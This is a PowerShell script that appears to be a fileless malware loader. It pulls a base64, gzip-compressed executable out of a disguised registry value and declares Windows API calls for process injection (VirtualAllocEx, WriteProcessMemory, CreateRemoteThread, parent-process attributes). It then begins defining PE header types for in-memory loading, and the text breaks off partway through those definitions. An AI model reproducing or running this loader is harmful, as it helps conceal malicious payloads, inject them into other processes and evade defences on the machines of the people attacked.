$rk = "HKCU:\Software\RegisteredApplications"
$rv = "AppXs42fd12c3po92dynnq2r142fs12qhvsmyy"
$p = (gp -Path $rk -Name $rv).$rv
$CompBytes = [System.Convert]::FromBase64String($p)
$input = New-Object System.IO.MemoryStream(,$CompBytes)
$output = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream $input,([IO.Compression.CompressionMode]::Decompress)
$gzipStream.CopyTo($output)
$gzipStream.Close()
$input.Close()
[byte[]] $PEBytes = $output.ToArray()

  Add-Type -TypeDefinition @"
  using System;
  using System.Runtime.InteropServices;

  [StructLayout(LayoutKind.Sequential)]
  public struct PROCESS_INFORMATION 
  {
     public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
  }

  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFOEX
  {
       public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct SECURITY_ATTRIBUTES
  {
      public int nLength; public IntPtr lpSecurityDescriptor; public int bInheritHandle;
  }

  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFO
  {
      public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
  }

  [Flags]
  public enum AllocationType
  {
       Commit = 0x1000,  Reserve = 0x2000,  Decommit = 0x4000,  Release = 0x8000,  Reset = 0x80000,  Physical = 0x400000,  TopDown = 0x100000,  WriteWatch = 0x200000,  LargePages = 0x20000000
  }

  [Flags]
  public enum MemoryProtection
  {
       Execute = 0x10,  ExecuteRead = 0x20,  ExecuteReadWrite = 0x40,  ExecuteWriteCopy = 0x80,  NoAccess = 0x01,  ReadOnly = 0x02,  ReadWrite = 0x04,  WriteCopy = 0x08,  GuardModifierflag = 0x100,  NoCacheModifierflag = 0x200,  WriteCombineModifierflag = 0x400
  }

  public static class Kernel32{
    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern IntPtr OpenProcess(
     UInt32 processAccess, 
     bool bInheritHandle, 
     int processId);

    [DllImport("kernel32.dll",  SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool InitializeProcThreadAttributeList(
         IntPtr lpAttributeList, 
         int dwAttributeCount, 
         int dwFlags, 
         ref IntPtr lpSize);

    [DllImport("kernel32.dll",  SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UpdateProcThreadAttribute(
         IntPtr lpAttributeList, 
         uint dwFlags, 
         IntPtr Attribute, 
         IntPtr lpValue, 
         IntPtr cbSize, 
         IntPtr lpPreviousValue, 
         IntPtr lpReturnSize);

    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern IntPtr GetProcessHeap();

    [DllImport("kernel32.dll",  SetLastError=false)]
    public static extern IntPtr HeapAlloc(IntPtr hHeap,  uint dwFlags,  UIntPtr dwBytes);

    [DllImport("kernel32.dll",  SetLastError=true)]
    public static extern bool CreateProcess(
       string lpApplicationName, 
       string lpCommandLine, 
       ref SECURITY_ATTRIBUTES lpProcessAttributes,  
       ref SECURITY_ATTRIBUTES lpThreadAttributes, 
       bool bInheritHandles,  
       uint dwCreationFlags, 
       IntPtr lpEnvironment, 
       string lpCurrentDirectory, 
       [In] ref STARTUPINFOEX lpStartupInfo,  
       out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll",  SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32.dll",  SetLastError=true,  ExactSpelling=true)]
    public static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,  
      IntPtr lpAddress, 
      Int32 dwSize,  
      AllocationType flAllocationType,  
      MemoryProtection flProtect);

    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern bool WriteProcessMemory(
      IntPtr hProcess,  
      IntPtr lpBaseAddress, 
      byte[] lpBuffer,  
      Int32 nSize,  
      out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(
      IntPtr hProcess,  
      IntPtr lpAddress, 
      Int32 dwSize,  
      uint flNewProtect,  
      out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
      IntPtr hProcess, 
      IntPtr lpThreadAttributes,  
      uint dwStackSize,  
      IntPtr lpStartAddress,  
      IntPtr lpParameter,  
      uint dwCreationFlags,  
      IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool ProcessIdToSessionId(uint dwProcessId,  out uint pSessionId);

    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentProcessId();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(
      IntPtr hModule,
      string procName);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(
      string lpModuleName);
  }
"@
 Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName("DynamicAssembly")
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("DynamicModule", $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

        $TypeBuilder = $ModuleBuilder.DefineEnum("MachineType", "Public", [UInt16])
        $TypeBuilder.DefineLiteral("Native", [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral("I386", [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral("Itanium", [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral("x64", [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        $TypeBuilder = $ModuleBuilder.DefineEnum("MagicType", "Public", [UInt16])
        $TypeBuilder.DefineLiteral("IMAGE_NT_OPTIONAL_HDR32_MAGIC", [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_NT_OPTIONAL_HDR64_MAGIC", [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        $TypeBuilder = $ModuleBuilder.DefineEnum("SubSystemType", "Public", [UInt16])
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_UNKNOWN", [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_NATIVE", [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_WINDOWS_GUI", [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_WINDOWS_CUI", [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_POSIX_CUI", [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_WINDOWS_CE_GUI", [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_EFI_APPLICATION", [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER", [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER", [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_EFI_ROM", [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_SUBSYSTEM_XBOX", [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        $TypeBuilder = $ModuleBuilder.DefineEnum("DllCharacteristicsType", "Public", [UInt16])
        $TypeBuilder.DefineLiteral("RES_0", [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral("RES_1", [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral("RES_2", [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral("RES_3", [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE", [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY", [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLL_CHARACTERISTICS_NX_COMPAT", [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLLCHARACTERISTICS_NO_ISOLATION", [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLLCHARACTERISTICS_NO_SEH", [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLLCHARACTERISTICS_NO_BIND", [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral("RES_4", [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLLCHARACTERISTICS_WDM_DRIVER", [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral("IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE", [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        $Attributes = "AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_DATA_DIRECTORY", $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField("VirtualAddress", [UInt32], "Public")).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField("Size", [UInt32], "Public")).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_FILE_HEADER", $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField("Machine", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfSections", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("TimeDateStamp", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("PointerToSymbolTable", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfSymbols", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("SizeOfOptionalHeader", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("Characteristics", [UInt16], "Public") | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        $Attributes = "AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_OPTIONAL_HEADER64", $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField("Magic", $MagicType, "Public")).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField("MajorLinkerVersion", [Byte], "Public")).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField("MinorLinkerVersion", [Byte], "Public")).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField("SizeOfCode", [UInt32], "Public")).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField("SizeOfInitializedData", [UInt32], "Public")).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField("SizeOfUninitializedData", [UInt32], "Public")).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField("AddressOfEntryPoint", [UInt32], "Public")).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField("BaseOfCode", [UInt32], "Public")).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField("ImageBase", [UInt64], "Public")).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField("SectionAlignment", [UInt32], "Public")).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField("FileAlignment", [UInt32], "Public")).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField("MajorOperatingSystemVersion", [UInt16], "Public")).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField("MinorOperatingSystemVersion", [UInt16], "Public")).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField("MajorImageVersion", [UInt16], "Public")).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField("MinorImageVersion", [UInt16], "Public")).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField("MajorSubsystemVersion", [UInt16], "Public")).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField("MinorSubsystemVersion", [UInt16], "Public")).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField("Win32VersionValue", [UInt32], "Public")).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField("SizeOfImage", [UInt32], "Public")).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeaders", [UInt32], "Public")).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField("CheckSum", [UInt32], "Public")).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField("Subsystem", $SubSystemType, "Public")).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField("DllCharacteristics", $DllCharacteristicsType, "Public")).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField("SizeOfStackReserve", [UInt64], "Public")).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField("SizeOfStackCommit", [UInt64], "Public")).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeapReserve", [UInt64], "Public")).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeapCommit", [UInt64], "Public")).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField("LoaderFlags", [UInt32], "Public")).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField("NumberOfRvaAndSizes", [UInt32], "Public")).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField("ExportTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField("ImportTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField("ResourceTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField("ExceptionTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField("CertificateTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField("BaseRelocationTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField("Debug", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField("Architecture", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField("GlobalPtr", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField("TLSTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField("LoadConfigTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField("BoundImport", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField("IAT", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField("DelayImportDescriptor", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField("CLRRuntimeHeader", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField("Reserved", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        $Attributes = "AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_OPTIONAL_HEADER32", $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField("Magic", $MagicType, "Public")).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField("MajorLinkerVersion", [Byte], "Public")).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField("MinorLinkerVersion", [Byte], "Public")).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField("SizeOfCode", [UInt32], "Public")).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField("SizeOfInitializedData", [UInt32], "Public")).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField("SizeOfUninitializedData", [UInt32], "Public")).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField("AddressOfEntryPoint", [UInt32], "Public")).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField("BaseOfCode", [UInt32], "Public")).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField("BaseOfData", [UInt32], "Public")).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField("ImageBase", [UInt32], "Public")).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField("SectionAlignment", [UInt32], "Public")).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField("FileAlignment", [UInt32], "Public")).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField("MajorOperatingSystemVersion", [UInt16], "Public")).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField("MinorOperatingSystemVersion", [UInt16], "Public")).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField("MajorImageVersion", [UInt16], "Public")).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField("MinorImageVersion", [UInt16], "Public")).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField("MajorSubsystemVersion", [UInt16], "Public")).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField("MinorSubsystemVersion", [UInt16], "Public")).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField("Win32VersionValue", [UInt32], "Public")).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField("SizeOfImage", [UInt32], "Public")).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeaders", [UInt32], "Public")).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField("CheckSum", [UInt32], "Public")).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField("Subsystem", $SubSystemType, "Public")).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField("DllCharacteristics", $DllCharacteristicsType, "Public")).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField("SizeOfStackReserve", [UInt32], "Public")).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField("SizeOfStackCommit", [UInt32], "Public")).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeapReserve", [UInt32], "Public")).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField("SizeOfHeapCommit", [UInt32], "Public")).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField("LoaderFlags", [UInt32], "Public")).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField("NumberOfRvaAndSizes", [UInt32], "Public")).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField("ExportTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField("ImportTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField("ResourceTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField("ExceptionTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField("CertificateTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField("BaseRelocationTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField("Debug", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField("Architecture", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField("GlobalPtr", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField("TLSTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField("LoadConfigTable", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField("BoundImport", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField("IAT", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField("DelayImportDescriptor", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField("CLRRuntimeHeader", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField("Reserved", $IMAGE_DATA_DIRECTORY, "Public")).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_NT_HEADERS64", $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField("Signature", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("FileHeader", $IMAGE_FILE_HEADER, "Public") | Out-Null
        $TypeBuilder.DefineField("OptionalHeader", $IMAGE_OPTIONAL_HEADER64, "Public") | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_NT_HEADERS32", $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField("Signature", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("FileHeader", $IMAGE_FILE_HEADER, "Public") | Out-Null
        $TypeBuilder.DefineField("OptionalHeader", $IMAGE_OPTIONAL_HEADER32, "Public") | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_DOS_HEADER", $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField("e_magic", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_cblp", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_cp", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_crlc", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_cparhdr", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_minalloc", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_maxalloc", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_ss", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_sp", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_csum", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_ip", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_cs", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_lfarlc", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_ovno", [UInt16], "Public") | Out-Null

        $e_resField = $TypeBuilder.DefineField("e_res", [UInt16[]], "Public, HasFieldMarshal")
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField("SizeConst"))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField("e_oemid", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("e_oeminfo", [UInt16], "Public") | Out-Null

        $e_res2Field = $TypeBuilder.DefineField("e_res2", [UInt16[]], "Public, HasFieldMarshal")
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField("e_lfanew", [Int32], "Public") | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_SECTION_HEADER", $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField("Name", [Char[]], "Public, HasFieldMarshal")
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField("VirtualSize", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("VirtualAddress", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("SizeOfRawData", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("PointerToRawData", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("PointerToRelocations", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("PointerToLinenumbers", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfRelocations", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfLinenumbers", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("Characteristics", [UInt32], "Public") | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_BASE_RELOCATION", $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField("VirtualAddress", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("SizeOfBlock", [UInt32], "Public") | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_IMPORT_DESCRIPTOR", $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField("Characteristics", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("TimeDateStamp", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("ForwarderChain", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("Name", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("FirstThunk", [UInt32], "Public") | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("IMAGE_EXPORT_DIRECTORY", $Attributes, [System.ValueType], 40)
